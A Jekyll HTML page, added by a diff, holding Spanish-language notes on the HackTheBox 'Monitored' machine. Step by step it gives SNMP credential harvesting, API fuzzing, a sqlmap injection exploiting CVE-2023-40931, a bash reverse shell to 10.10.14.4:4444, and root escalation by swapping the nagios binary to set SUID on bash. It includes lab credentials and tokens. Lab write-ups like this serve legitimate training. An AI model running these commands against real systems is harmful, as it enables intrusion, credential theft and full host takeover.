@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; ldap://monitored.htb &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; base namingcontexts&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-H</span> ldap://monitored.htb <span class="nt">-x</span> <span class="nt">-s</span> base namingcontexts
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-H</span> ldap://monitored.htb <span class="nt">-x</span> <span class="nt">-b</span> <span class="s2">"dc=monitored,dc=htb"</span>
+</code></pre></div></div>
+
+<p>SCAN UDP -sU</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">--open</span> 10.10.11.248
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-P</span> /usr/share/SecLists/Discovery/SNMP/common-snmp-community-strings.txt monitored.htb snmp
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmpbulkwalk <span class="nt">-c</span> public <span class="nt">-v2c</span> 10.10.11.248 <span class="nb">.</span> | <span class="nb">tee </span>snmp_data
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc \ XjH7VCehowpR1xZB
+</code></pre></div></div>
+
+<p>Fuzzear endpoints a partir de :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://nagios.monitored.htb/nagiosxi/api
+</code></pre></div></div>
+
+<p>GET y POST</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-u</span> https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ <span class="nt">-w</span> /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  <span class="nt">-t</span> 150 <span class="nt">-fs</span> 32
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-u</span> https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ <span class="nt">-w</span> /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  <span class="nt">-t</span> 150 <span class="nt">-fs</span> 32 <span class="nt">-X</span> POST
+</code></pre></div></div>
+
+<p><a href="https://github.com/chrislockard/api_wordlist">GitHub - chrislockard/api_wordlist: A wordlist of API names for web application assessments</a></p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">POST /nagiosxi/api/v1/authenticate
+
+username=svc&amp;password=XjH7VCehowpR1xZB
+</span></code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://nagios.monitored.htb/nagiosxi/?token=4974cd07de85be10303478189d2a1bd0215bff3d
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Nagios XI 5.11.0 -&gt; CVE-2023-40931</code></p>
+
+<p>![[image-20240508194342678.webp]]![[image-20240508194415753.webp]]</p>
+
+<pre><code class="language-BASH">sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&amp;action=acknowledge_banner_message" -p id --cookie "nagiosxi=bspu3ilq508jivkicfqofjo29g" --batch --threads 10
+</code></pre>
+
+<pre><code class="language-BASH">sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&amp;action=acknowledge_banner_message" -p id --cookie "nagiosxi=a4i4msg08i966d4ghlrhqrj963" --batch --threads 10 --dump -T xi_users
+</code></pre>
+
+<h1 id="rce-como-admin">RCE como admin</h1>
+
+<p><code class="language-plaintext highlighter-rouge">Configure -&gt; Core Config Manager -&gt; Commands</code></p>
+
+<p>Creamos rev shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-c</span> <span class="s1">'/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.4/4444 0&gt;&amp;1'</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Core Config -&gt; Hosts -&gt; Localhost -&gt; Check commands -&gt; Run check command</code></p>
+
+<h1 id="root">ROOT</h1>
+
+<p>Para escalar podemos cambiar el binario de nagios <code class="language-plaintext highlighter-rouge">/usr/local/nagios/bin/nagios</code> por:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nb">chmod </span>u+s /bin/bash
+</code></pre></div></div>
+
+<p>Restablecer el servicio</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/local/nagiosxi/scripts/manage_services.sh restart nagios
+</code></pre></div></div>
+
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
